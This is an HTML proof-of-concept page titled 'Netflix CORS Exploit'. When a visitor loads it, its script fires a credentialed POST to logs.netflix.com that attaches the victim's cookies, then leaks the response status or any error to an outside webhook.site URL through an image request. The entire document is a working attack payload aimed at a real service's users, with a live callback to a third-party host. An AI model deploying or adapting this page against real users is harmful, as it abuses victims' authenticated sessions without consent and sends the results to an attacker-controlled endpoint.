<!DOCTYPE html>
<html>
  <head>
    <title>Netflix CORS Exploit</title>
  </head>
  <body>
    <h2>CORS PoC Exploit</h2>
    <h3>Status will be leaked to Webhook</h3>

    <script>
      (async () => {
        try {
          // Construct valid payload (trimmed for brevity)
          const payload = {
            currentState: {
              "4572197127044811": {
                source: "www",
                schema: { name: "netflixApp", version: "1.744.0" },
                type: ["Log", "Session"],
                id: 4572197127044811,
                sequence: 1,
                time: 1746874828147
              }
              // Add more keys if needed
            },
            reverseDeltas: [],
            type: "CompactConsolidatedLoggingEnvelope",
            version: 2,
            clientSendTime: 1746874843576
          };

          // Fire credentialed POST request to logs.netflix.com
          const res = await fetch("https://logs.netflix.com/log/www/cl/2", {
            method: "POST",
            credentials: "include", // attach victim cookies
            headers: {
              "Content-Type": "application/json",
              "X-Netflix.request.name": "ui/cl",
              "X-Netflix.request.attempt": "1",
              "X-Netflix.request.client.context": JSON.stringify({
                appstate: "background"
              })
            },
            body: JSON.stringify(payload)
          });

          // Leak HTTP status via <img> to your webhook
          const leak = new Image();
          leak.src =
            "https://webhook.site/4e1148e7-6ade-4b05-86c9-fd4e86d6e8be" +
            "?status=" + res.status;
        } catch (e) {
          const err = new Image();
          err.src =
            "https://webhook.site/4e1148e7-6ade-4b05-86c9-fd4e86d6e8be" +
            "?error=" + encodeURIComponent(e.message);
        }
      })();
    </script>
  </body>
</html>
